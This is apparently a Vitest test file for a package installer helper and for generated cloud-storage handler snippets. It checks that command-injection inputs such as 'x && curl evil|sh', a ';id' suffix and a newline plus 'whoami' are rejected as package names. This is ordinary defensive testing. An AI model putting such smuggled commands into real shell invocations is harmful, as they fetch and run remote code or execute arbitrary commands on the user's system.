import { describe, expect, it } from 'vitest';
import ts from 'typescript';
import { resolve } from 'node:path';
import { byosConfig, installCommand } from './scaffolds.js';

describe('installCommand', () => {
  it.each(['x && curl evil|sh', '@uploadkitdev/react;id', '--help', 'react', '@uploadkitdev/next\nwhoami'])(
    'rejects unsafe or unsupported package %j', (pkg) => {
      expect(() => installCommand('pnpm', [pkg])).toThrow(/package/i);
    },
  );
  it('rejects unknown package managers at runtime', () => {
    expect(() => installCommand('evil' as 'pnpm', ['@uploadkitdev/react'])).toThrow(/manager/i);
  });
  it.each(['pnpm', 'npm', 'yarn', 'bun'] as const)('supports %s and dev installs', (pm) => {
    expect(installCommand(pm, ['@uploadkitdev/react', '@uploadkitdev/next']))
      .toContain('@uploadkitdev/react @uploadkitdev/next');
    expect(installCommand(pm, ['@uploadkitdev/react'], true)).toMatch(/-D|--dev|--save-dev/);
  });
});

// Compile the actual generated handler against the installed workspace SDK,
// without emitting or writing temporary source files.
describe('BYOS snippets', () => {
  it.each(['gcs', 'b2', 's3', 'r2'] as const)('%s compiles against the public SDK', (provider) => {
    const filename = resolve('packages/mcp-core/src/__generated_handler.ts');
    const options: ts.CompilerOptions = {
      strict: true, noEmit: true, skipLibCheck: true,
      target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.ESNext,
      moduleResolution: ts.ModuleResolutionKind.Bundler,
      types: ['node'], typeRoots: [resolve('packages/mcp-core/node_modules/@types')],
      paths: {
        '@uploadkitdev/next': [resolve('packages/next/dist/index.d.ts')],
        '@uploadkitdev/next/byos': [resolve('packages/next/dist/byos-entry.d.ts')],
      },
    };
    const host = ts.createCompilerHost(options);
    const originalGetSourceFile = host.getSourceFile.bind(host);
    host.getSourceFile = (path, languageVersion, onError, shouldCreateNewSourceFile) =>
      path === filename
        ? ts.createSourceFile(path, byosConfig(provider).handler, languageVersion, true)
        : originalGetSourceFile(path, languageVersion, onError, shouldCreateNewSourceFile);
    const program = ts.createProgram([filename], options, host);
    const diagnostics = ts.getPreEmitDiagnostics(program).map((d) =>
      ts.flattenDiagnosticMessageText(d.messageText, '\n'));
    expect(diagnostics).toEqual([]);
  });
});
